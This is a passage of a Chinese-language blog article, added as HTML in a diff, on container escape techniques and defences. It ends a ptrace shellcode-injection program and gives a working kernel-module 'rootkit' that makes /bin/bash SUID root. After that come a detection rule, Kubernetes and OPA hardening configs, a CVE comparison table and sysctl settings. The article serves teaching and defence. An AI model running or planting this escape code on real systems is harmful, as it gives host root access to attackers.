+<span class="w">    </span><span class="kt">pid_t</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w">  </span><span class="c1">// 宿主机进程 PID</span>
+
+<span class="w">    </span><span class="c1">// 1. 附加到目标进程</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;PTRACE_ATTACH&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">waitpid</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 2. 获取寄存器</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">user_regs_struct</span><span class="w"> </span><span class="n">regs</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 3. 逐字注入 shellcode 到 RIP 处</span>
+<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span>
+<span class="w">               </span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">),</span><span class="w"> </span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 4. 恢复执行，目标进程以宿主身份跑 shellcode</span>
+<span class="w">    </span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 5. 分离</span>
+<span class="w">    </span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>3. CAP_SYS_MODULE → 加载内核模块</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 准备一个恶意内核模块 init_module 会调用 run_cmd</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>rootkit.c<span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">#include &lt;linux/module.h&gt;</span>
+<span class="s">#include &lt;linux/kmod.h&gt;</span>
+<span class="s">static int __init rootkit_init(void) {</span>
+<span class="s">    char *argv[] = {&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;chmod 4777 /bin/bash&quot;, NULL};</span>
+<span class="s">    char *envp[] = {&quot;PATH=/usr/bin&quot;, NULL};</span>
+<span class="s">    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);</span>
+<span class="s">    return 0;</span>
+<span class="s">}</span>
+<span class="s">module_init(rootkit_init);</span>
+<span class="s">MODULE_LICENSE(&quot;GPL&quot;);</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 编译并加载（CAP_SYS_MODULE 直接 insmod）</span>
+make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>/build<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="w"> </span>modules
+insmod<span class="w"> </span>rootkit.ko
+<span class="c1"># /bin/bash 现已 SUID root</span>
+</code></pre></div>
+
+<h3>检测</h3>
+<div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Suspicious Capability Usage in Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内 ptrace/insmod/cgroup 挂载等危险操作</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">container.id != host and</span>
+<span class="w">    </span><span class="no">(proc.name=insmod or</span>
+<span class="w">     </span><span class="no">proc.name in (strace, gdb, ltrace) or</span>
+<span class="w">     </span><span class="no">(open_write and fd.name contains &quot;cgroup.procs&quot;))</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Dangerous capability usage</span>
+<span class="w">    </span><span class="no">(container=%container.id proc=%proc.name</span>
+<span class="w">    </span><span class="no">cmdline=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">capabilities</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>防御</h3>
+<table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--cap-drop ALL</code></td>
+<td>丢弃所有 capabilities，按需 <code>--cap-add</code> 极少项</td>
+</tr>
+<tr>
+<td>K8s PSS <code>restricted</code></td>
+<td>Pod Security Standards restricted 策略禁止多数 cap</td>
+</tr>
+<tr>
+<td>seccomp 默认 profile</td>
+<td>限制 ptrace/module 相关系统调用</td>
+</tr>
+<tr>
+<td>审计 SUID/SGID</td>
+<td>定期扫描容器内新增的 SUID 二进制</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>综合防御架构</h2>
+<p>容器逃逸防御是一个纵深体系，单点防护难以奏效。以下是综合方案。</p>
+<h3>1. K8s 最小权限 Pod 配置示例</h3>
+<div class="highlight"><pre><span></span><code><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">hardened-app</span>
+<span class="w">  </span><span class="nt">labels</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">hardened-app</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="c1"># 1. 强制非 root 运行</span>
+<span class="w">  </span><span class="nt">securityContext</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">runAsNonRoot</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+<span class="w">    </span><span class="nt">runAsUser</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10001</span>
+<span class="w">    </span><span class="nt">runAsGroup</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10001</span>
+<span class="w">    </span><span class="nt">fsGroup</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10001</span>
+<span class="w">    </span><span class="nt">seccompProfile</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RuntimeDefault</span><span class="w">          </span><span class="c1"># 启用默认 seccomp profile</span>
+<span class="w">  </span><span class="nt">containers</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app</span>
+<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">myapp:1.0</span>
+<span class="w">    </span><span class="c1"># 2. 容器级安全加固</span>
+<span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">allowPrivilegeEscalation</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span><span class="w">   </span><span class="c1"># 禁止 SUID 提权</span>
+<span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span><span class="w">                  </span><span class="c1"># 非特权</span>
+<span class="w">      </span><span class="nt">readOnlyRootFilesystem</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">       </span><span class="c1"># 根文件系统只读</span>
+<span class="w">      </span><span class="nt">runAsNonRoot</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+<span class="w">      </span><span class="nt">capabilities</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">drop</span><span class="p">:</span><span class="w">                            </span><span class="c1"># 丢弃所有 capabilities</span>
+<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ALL</span>
+<span class="w">        </span><span class="c1"># add: []                        # 仅按需添加，原则上留空</span>
+<span class="w">    </span><span class="c1"># 3. 资源与挂载最小化</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">limits</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;256Mi&quot;</span>
+<span class="w">        </span><span class="nt">cpu</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;500m&quot;</span>
+<span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">tmp</span>
+<span class="w">      </span><span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/tmp</span>
+<span class="w">  </span><span class="nt">volumes</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">tmp</span>
+<span class="w">    </span><span class="nt">emptyDir</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">{}</span><span class="w">                          </span><span class="c1"># 可写临时目录</span>
+<span class="w">  </span><span class="c1"># 4. 禁止 host 命名空间共享</span>
+<span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+<span class="w">  </span><span class="nt">hostIPC</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+<span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+</code></pre></div>
+
+<h3>2. OPA Gatekeeper 策略（阻止特权 Pod）</h3>
+<div class="highlight"><pre><span></span><code><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">templates.gatekeeper.sh/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ConstraintTemplate</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">k8sdisallowprivileged</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">crd</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">spec</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">names</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">K8sDisallowPrivileged</span>
+<span class="w">  </span><span class="nt">targets</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">target</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admission.k8s.gatekeeper.sh</span>
+<span class="w">    </span><span class="nt">rego</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">      </span><span class="no">package k8sdisallowprivileged</span>
+
+<span class="w">      </span><span class="no">violation[{&quot;msg&quot;: msg}] {</span>
+<span class="w">        </span><span class="no">container := input.review.object.spec.containers[_]</span>
+<span class="w">        </span><span class="no">container.securityContext.privileged == true</span>
+<span class="w">        </span><span class="no">msg := sprintf(&quot;容器 %v 禁止使用 privileged: true&quot;, [container.name])</span>
+<span class="w">      </span><span class="no">}</span>
+
+<span class="w">      </span><span class="no">violation[{&quot;msg&quot;: msg}] {</span>
+<span class="w">        </span><span class="no">container := input.review.object.spec.containers[_]</span>
+<span class="w">        </span><span class="no">cap := container.securityContext.capabilities.add[_]</span>
+<span class="w">        </span><span class="no">cap == &quot;SYS_ADMIN&quot;</span>
+<span class="w">        </span><span class="no">msg := sprintf(&quot;容器 %v 禁止添加 CAP_SYS_ADMIN&quot;, [container.name])</span>
+<span class="w">      </span><span class="no">}</span>
+
+<span class="w">      </span><span class="no">violation[{&quot;msg&quot;: msg}] {</span>
+<span class="w">        </span><span class="no">input.review.object.spec.hostPID == true</span>
+<span class="w">        </span><span class="no">msg := &quot;禁止使用 hostPID&quot;</span>
+<span class="w">      </span><span class="no">}</span>
+<span class="nn">---</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">constraints.gatekeeper.sh/v1beta1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">K8sDisallowPrivileged</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">no-privileged-pods</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">match</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">kinds</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">kinds</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;Pod&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">excludedNamespaces</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;kube-system&quot;</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>3. 六种技术对比总结表</h3>
+<table>
+<thead>
+<tr>
+<th>技术</th>
+<th>CVE</th>
+<th>根因</th>
+<th>前提条件</th>
+<th>影响内核版本</th>
+<th>是否需要特权</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cgroup release_agent</td>
+<td>CVE-2022-0492</td>
+<td>权限检查用 ns_capable 未限定 init_user_ns</td>
+<td>user namespace 可用 + cgroup v1</td>
+<td>&lt; 5.17</td>
+<td>否（unshare 即可）</td>
+</tr>
+<tr>
+<td>Namespace 切换</td>
+<td>—</td>
+<td>setns 合法机制被滥用</td>
+<td>hostPID / CAP_SYS_ADMIN / 可访问 /proc/pid/ns</td>
+<td>全版本</td>
+<td>视场景而定</td>
+</tr>
+<tr>
+<td>procfs/sysfs 滥用</td>
+<td>—</td>
+<td>内核 helper 不感知 NS 隔离</td>
+<td>可写 /proc/sys（CAP_SYS_ADMIN 或特权）</td>
+<td>全版本</td>
+<td>是（需写 /proc/sys）</td>
+</tr>
+<tr>
+<td>Dirty Pipe</td>
+<td>CVE-2022-0847</td>
+<td>splice 未清除 PIPE_BUF_FLAG_CAN_MERGE</td>
+<td>可读目标文件</td>
+<td>5.8 ~ 5.16.10</td>
+<td>否（普通权限）</td>
+</tr>
+<tr>
+<td>OverlayFS copy-up</td>
+<td>CVE-2023-0386</td>
+<td>copy-up 未检查 kuid 映射，走私 SUID</td>
+<td>user namespace + FUSE</td>
+<td>&lt; 6.2</td>
+<td>否（unshare + FUSE）</td>
+</tr>
+<tr>
+<td>Capabilities 滥用</td>
+<td>—</td>
+<td>单个 cap 等同 root</td>
+<td>容器保留危险 cap</td>
+<td>全版本</td>
+<td>视 cap 而定</td>
+</tr>
+</tbody>
+</table>
+<h3>4. 纵深防御清单</h3>
+<div class="highlight"><pre><span></span><code>   应用层    ┌─────────────────────────────────────────┐
+            │ OPA Gatekeeper / Kyverno 准入控制         │
+            │ Pod Security Standards (restricted)       │
+            ├─────────────────────────────────────────┤
+   容器层    │ runAsNonRoot / readOnlyRootFS            │
+            │ seccomp RuntimeDefault / 自定义 profile    │
+            │ cap-drop ALL / AppArmor / SELinux         │
+            ├─────────────────────────────────────────┤
+   内核层    │ 及时升级内核 / 禁用 user namespace        │
+            │ cgroup v2 / 模块签名 / lockdown           │
+            ├─────────────────────────────────────────┤
+   运行时    │ Falco / Datadog CWS / Elastic Security   │
+   检测      │ auditd / eBPF 行为基线告警                │
+            ├─────────────────────────────────────────┤
+   主机层    │ 内核加固(grsec/KSPP) / 最小化宿主进程     │
+            │ EDR / 文件完整性监控                       │
+            └─────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>5. 关键内核参数加固</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># /etc/sysctl.d/99-container-hardening.conf</span>
+
+<span class="c1"># 禁用 user namespace（阻断 unshare 逃逸路径，按需评估业务影响）</span>
+user.max_user_namespaces<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+
+<span class="c1"># 禁止非签名内核模块加载（阻断 CAP_SYS_MODULE）</span>
+kernel.modules_disabled<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="w">    </span><span class="c1"># 注意：设置后不可逆，需重启恢复</span>
+
+<span class="c1"># 限制 ptrace（阻断 CAP_SYS_PTRACE 进程注入）</span>
+kernel.yama.ptrace_scope<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span><span class="w">   </span><span class="c1"># 仅允许 ptrace 自身或 root（0=全部/1=受限/2=仅admin/3=禁止）</span>
+
+<span class="c1"># 禁止核心转储 helper（缓解 core_pattern，治标）</span>
+<span class="c1"># fs.suid_dumpable = 0         # SUID 程序不产生 core（默认已是 0）</span>
+
+<span class="c1"># 启用内核 lockdown（限制 root 滥用 /dev/mem 等）</span>
+<span class="c1"># 需内核编译 CONFIG_LOCKDOWN_LSM</span>
+</code></pre></div>
+
+<hr />
+<h2>结语</h2>
+<p>容器逃逸的本质，是攻击者在"共享内核"这一前提下，寻找内核中那些<strong>不尊重命名空间边界</strong>的代码路径。本文梳理的六种技术，从 cgroup release_agent 的权限检查缺陷，到 Dirty Pipe 的页缓存绕过，再到 OverlayFS 的 copy-up 映射遗漏，每一处都是"内核设计时未考虑容器场景"的典型缩影。</p>
+<p>值得注意的是，这些技术中真正属于"内核漏洞"（第三层）的只有 Dirty Pipe 与 OverlayFS 两项，其余四项本质上都是"内核合法机制被滥用"（第一层配置 + 第二层设计假设）。这提示我们：</p>
+<ol>
+<li><strong>配置即安全</strong>——绝大多数逃逸源于特权容器、危险挂载、过度 capabilities。遵循最小权限原则可消除 90% 的攻击面。</li>
+<li><strong>隔离边界是内核给的，不是天然的</strong>——只要内核某条路径不感知 NS，隔离就形同虚设。持续关注 CVE 与内核补丁是必修课。</li>
+<li><strong>纵深防御不可或缺</strong>——准入控制、seccomp、AppArmor、运行时检测、内核加固需层层叠加，任何单点都可能被绕过。</li>
+</ol>
+<p>容器安全不是"装上就能用"的产品，而是一套贯穿开发、部署、运行、检测全生命周期的工程实践。理解逃逸原理，正是构建这套实践的前提。</p>
+<hr />
+<p><em>参考来源：CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 官方公告与补丁、Linux 内核源码、Falco/Elastic/Datadog 官方安全规则库。</em></p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
